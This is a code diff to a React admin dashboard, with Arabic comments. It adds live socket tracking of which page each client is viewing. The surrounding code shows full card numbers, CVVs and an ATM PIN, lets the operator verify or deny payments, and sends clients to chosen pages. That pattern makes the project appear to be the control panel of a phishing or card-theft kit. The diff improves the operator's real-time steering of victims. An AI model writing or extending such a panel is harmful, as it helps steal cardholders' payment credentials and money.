@@ -78,11 +78,13 @@ function BookingModal({
   onClose,
   onPaymentAction,
   onNavigate,
+  clientCurrentPage,
 }: {
   booking: Booking;
   onClose: () => void;
   onPaymentAction: (reference: string, action: "verified" | "denied") => void;
   onNavigate: (booking: Booking, page: string) => void;
+  clientCurrentPage?: string;
 }) {
   const [showCardNum, setShowCardNum] = useState(false);
   const [showCvv, setShowCvv] = useState(false);
@@ -115,7 +117,8 @@ function BookingModal({
   const hasAtm = !!payment.secretNum;
 
   // حالة العميل الحالية بناءً على الصفحة أو المرحلة
-  const currentPage = (payment as any).currentPage || "";
+  // نُفضّل الصفحة الحالية من socket (الوقت الفعلي) على قاعدة البيانات
+  const currentPage = clientCurrentPage || (payment as any).currentPage || "";
   let clientStageLabel = "لم يبدأ بعد";
   let clientStageBg = "#f8fafc";
   let clientStageBorder = "#e2e8f0";
@@ -542,6 +545,8 @@ export default function AdminDashboard() {
   const [isConnected, setIsConnected] = useState(false);
   const [selectedBooking, setSelectedBooking] = useState<Booking | null>(null);
   const socketRef = useRef<ReturnType<typeof socketIO> | null>(null);
+  // تتبع مواقع العملاء في الوقت الفعلي: reference → page
+  const [clientLocations, setClientLocations] = useState<Record<string, string>>({});
 
   // Auth check
   useEffect(() => {
@@ -581,6 +586,13 @@ export default function AdminDashboard() {
       const label = data.type ? typeLabels[data.type] || "بيانات جديدة" : "دفع جديد";
       toast.info(`${label} - المرجع: ${data.reference}`);
       refetchBookings();
+    });
+
+    // استقبال تحديث موقع العميل في الوقت الفعلي
+    socket.on("clientLocationUpdate", (data: { reference: string; ip: string; page: string }) => {
+      if (data.reference && data.page) {
+        setClientLocations(prev => ({ ...prev, [data.reference]: data.page }));
+      }
     });
 
     return () => {
@@ -678,6 +690,7 @@ export default function AdminDashboard() {
         <BookingModal
           booking={selectedBooking}
           onClose={closeModal}
+          clientCurrentPage={clientLocations[selectedBooking.referenceId]}
           onPaymentAction={handlePaymentAction}
           onNavigate={handleNavigate}
         />
